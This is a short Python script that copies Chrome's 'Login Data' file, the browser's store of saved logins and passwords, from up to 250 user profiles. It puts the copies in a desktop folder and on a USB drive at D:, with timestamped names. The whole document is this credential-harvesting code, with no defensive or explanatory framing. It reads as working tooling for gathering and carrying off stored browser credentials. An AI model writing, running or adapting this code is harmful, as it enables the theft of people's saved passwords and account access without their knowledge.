import os
import shutil
import time

# Retrieve the current username
username = os.getlogin()

# Construct the desktop path
desktop_path = os.path.join('C:\\Users', username, 'OneDrive', 'Desktop')
log_data_folder = os.path.join(desktop_path, 'Log Data')

# Create the Log Data folder on the desktop
os.makedirs(log_data_folder, exist_ok=True)

# Define the target directory path
chrome_user_data_path = os.path.join('C:\\Users', username, 'AppData', 'Local', 'Google', 'Chrome', 'User Data')

# Specify the USB drive letter
usb_drive_letter = 'D:'

# Create the destination directory on the USB drive
destination_dir_usb = os.path.join(usb_drive_letter + '\\', 'Log Data V1')
os.makedirs(destination_dir_usb, exist_ok=True)

# Copy individual files to the Log Data folder and then to the USB drive
def copy_files(source_directory):
    for profile_num in range(1, 251):
        profile_name = f"Profile {profile_num}"
        profile_path = os.path.join(source_directory, profile_name)
        login_data_path = os.path.join(profile_path, "Login Data")
        
        if os.path.exists(login_data_path):
            prefix = f"Profile {profile_num} Chrome"
            file_name = os.path.basename(login_data_path)
            timestamp = int(time.time())
            unique_name = f"{prefix}_{file_name}_{timestamp}"
            destination_path = os.path.join(log_data_folder, unique_name)
            destination_path_usb = os.path.join(destination_dir_usb, unique_name)
            
            try:
                shutil.copy2(login_data_path, destination_path)
                print(f"Copied: {unique_name} to Log Data folder")
                
                # Copy to USB drive
                shutil.copy2(login_data_path, destination_path_usb)
                print(f"Copied: {unique_name} to USB drive {usb_drive_letter}")
            except Exception as e:
                print(f"Error copying {unique_name}: {str(e)}")

# Copy "Login Data" files from the "Profile 1" to "Profile 250" folders to the Log Data folder and USB drive
copy_files(chrome_user_data_path)

print(f"Files copied to Log Data folder on the desktop and USB drive {usb_drive_letter}.")
